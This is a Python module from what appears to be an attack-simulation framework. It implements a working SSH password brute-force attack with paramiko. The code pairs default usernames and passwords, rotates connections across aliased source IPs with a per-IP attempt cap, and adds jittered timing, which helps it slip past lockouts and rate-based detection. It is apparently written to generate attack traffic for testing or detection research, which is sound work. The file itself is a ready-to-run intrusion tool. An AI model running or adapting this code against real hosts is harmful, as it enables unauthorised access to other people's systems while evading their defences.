"""SSH brute force attack module using paramiko."""

from __future__ import annotations

import logging
import random
import socket
import time
from datetime import datetime, timezone

import paramiko

from attacks.config import PhaseConfig
from attacks.modules.base import AttackModule, AttackModuleRegistry, AttackResult, TimingProfile


@AttackModuleRegistry.register("ssh_brute_force")
class SSHBruteForceModule(AttackModule):
    """SSH password brute force from multiple aliased source IPs.

    Binds each connection to a specific aliased IP via socket.bind().
    Supports non-stationary timing profiles (accelerating/decelerating).
    """

    def execute(
        self,
        target: str,
        phase: PhaseConfig,
        ips: list[str],
        rng: random.Random,
        logger: logging.Logger,
    ) -> AttackResult:
        usernames = phase.params.get("usernames", ["root", "admin"])
        passwords = phase.params.get("passwords", ["password", "123456"])
        max_per_ip = phase.params.get("max_attempts_per_ip", 5)
        port = phase.params.get("target_port", 22)
        timing = TimingProfile(phase.timing)
        duration = phase.timing.duration_seconds

        # Build credential list, shuffle for realism
        creds = [(u, p) for u in usernames for p in passwords]
        rng.shuffle(creds)

        start_time = datetime.now(timezone.utc)
        deadline = time.monotonic() + duration
        attempts = 0
        successes = 0
        errors: list[str] = []
        ip_attempt_counts: dict[str, int] = {ip: 0 for ip in ips}

        logger.info(
            "Starting SSH brute force on %s:%d — %d creds × %d IPs (duration: %ds)",
            target, port, len(creds), len(ips), duration,
        )

        cred_idx = 0
        while time.monotonic() < deadline and cred_idx < len(creds) * len(ips):
            elapsed = time.monotonic() - (deadline - duration)
            progress = min(elapsed / duration, 1.0)

            # Pick an IP that hasn't exhausted its attempt budget
            available_ips = [ip for ip in ips if ip_attempt_counts[ip] < max_per_ip]
            if not available_ips:
                logger.info("All IPs exhausted max attempts, stopping")
                break

            src_ip = rng.choice(available_ips)
            username, password = creds[cred_idx % len(creds)]
            cred_idx += 1

            success = self._try_login(target, port, src_ip, username, password, logger)
            attempts += 1
            ip_attempt_counts[src_ip] += 1

            if success:
                successes += 1
                logger.info("SUCCESS: %s@%s from %s", username, target, src_ip)

            # Apply timing profile delay
            delay_ms = timing.get_jitter_ms(progress, rng)
            time.sleep(delay_ms / 1000.0)

        end_time = datetime.now(timezone.utc)
        logger.info(
            "SSH brute force complete: %d attempts, %d successes, %d errors",
            attempts, successes, len(errors),
        )

        return AttackResult(
            phase_name=phase.name,
            module_name=self.name,
            start_time=start_time,
            end_time=end_time,
            source_ips=ips,
            attempts=attempts,
            successes=successes,
            errors=errors[:10],
            metadata={
                "usernames": usernames,
                "port": port,
                "ip_attempts": dict(ip_attempt_counts),
            },
        )

    @staticmethod
    def _try_login(
        target: str,
        port: int,
        src_ip: str,
        username: str,
        password: str,
        logger: logging.Logger,
    ) -> bool:
        """Attempt SSH login, binding to src_ip. Returns True on success."""
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            # Create a socket bound to the source IP
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.bind((src_ip, 0))
            sock.connect((target, port))

            client.connect(
                target,
                port=port,
                username=username,
                password=password,
                sock=sock,
                timeout=10,
                look_for_keys=False,
                allow_agent=False,
            )
            return True
        except paramiko.AuthenticationException:
            return False  # Expected — wrong password
        except Exception as e:
            logger.debug("SSH error %s@%s from %s: %s", username, target, src_ip, e)
            return False
        finally:
            client.close()
